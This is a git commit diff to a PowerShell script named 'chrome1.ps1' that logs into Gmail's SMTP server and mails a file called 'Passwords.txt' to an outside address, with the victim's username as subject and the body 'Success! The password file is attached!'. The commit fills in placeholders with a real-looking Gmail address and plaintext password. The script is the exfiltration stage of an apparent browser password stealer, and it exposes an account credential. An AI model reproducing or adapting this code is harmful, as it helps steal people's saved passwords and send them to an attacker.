15f5cd0a339d2d5961d0b1e6247514c85f9f875b
31victor <victorramirez777726@gmail.com>
2022-01-07 20:45:38 -0300

    Update chrome1.ps1

--- chrome1.ps1
+++ chrome1.ps1
@@ -1,10 +1,10 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL_ADDRESS', 'EMAIL_PASSWORD')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ravemovie777726@gmail.com', 'R.M@2022')
 $E = New-Object System.Net.Mail.MailMessage
-$E.From = 'EMAIL_ADDRESS'
-$E.To.Add('EMAIL_ADDRESS')
+$E.From = 'ravemovie777726@gmail.com'
+$E.To.Add('victorrmirez777726@gmail.com')
 $E.Subject = $env:UserName
 $E.Body = 'Success! The password file is attached!'
 $F = "Passwords.txt"
